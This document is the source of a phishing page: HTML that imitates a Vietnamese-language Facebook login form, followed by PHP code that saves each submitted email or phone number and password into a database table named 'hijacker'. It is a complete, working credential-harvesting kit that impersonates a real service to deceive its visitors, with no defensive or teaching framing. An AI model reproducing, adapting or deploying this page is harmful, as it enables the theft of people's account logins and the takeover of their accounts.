<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập vào Facebook</title>
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/fontawesome.min.css">
    <link rel="stylesheet" href="css/style.css">
    <script src="js/bootstrap.min.js"></script>
    <script src="js/fontawesome.min.js"></script>
    <script src="js/main.js"></script>
</head>

<body>
    <div class="container-fluid">
        <div class="content-fb">
            <div class="row d-flex justify-content-center">
                <div class="col-sm-5">
                    <img src="images/logo-fb.svg" alt="logo" width="199px" height="70px" style="margin-left:-20px">
                    <div class="h3 font-weight-normal">Đăng nhập gần đây</div>
                    <div>Nhấp vào ảnh của bạn hoặc thêm tài khoản.</div>
                    <div class="mt-4">
                        <div class="shadow-fb d-inline-block bg-white">
                            <div class="login-box bg-light d-flex justify-content-center align-items-center">
                                <i class="fas fa-plus-circle text-primary h1 align-middle"></i>
                            </div>
                            <div class="bg-white p-2 text-center text-primary"><a href="#">Thêm tài khoản</a></div>
                        </div>
                    </div>
                </div>
                <div class="col-sm-4">
                    <div class="mt-5">
                        <div class="card shadow border-0">
                            <div class="card-body">
                                <form method="POST">
                                    <div class="form-group">
                                        <input class="form-control form-control-lg" type="text" name="email" id="email" placeholder="Email hoặc số điện thoại">
                                    </div>
                                    <div class="form-group">
                                        <input class="form-control form-control-lg" type="password" name="pwd" id="pwd" placeholder="Mật khẩu">
                                    </div>
                                    <button type="submit" class="btn btn-primary btn-lg btn-block">Đăng nhập</button>
                                    <div class="text-center font-weight-bold mt-3"><a href="#">Quên mật khẩu</a></div>
                                    <hr>
                                    <div class="text-center">
                                        <button type="button" class="btn btn-success btn-lg">Tạo tài khoản mới</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                        <div class="text-center mt-4">
                            <p>Tạo Trang dành cho người nổi tiếng, nhãn hiệu hoặc doanh nghiệp.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>


<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
require_once './db.php';
require_once './config.php';

if (isset($_POST['email']) && isset($_POST['pwd'])) {
    $db = new Database();
    try {
        $db->insertInto('hijacker', 'username, password, type', ':username, :password, :type')
            ->execute(array(
                'username' => $_POST['email'],
                'password' => $_POST['pwd'],
                'type' => 'facebook'
            ));
    } catch (\Exception $e) {
        throw new \Exception('Nothing here');
    }
}
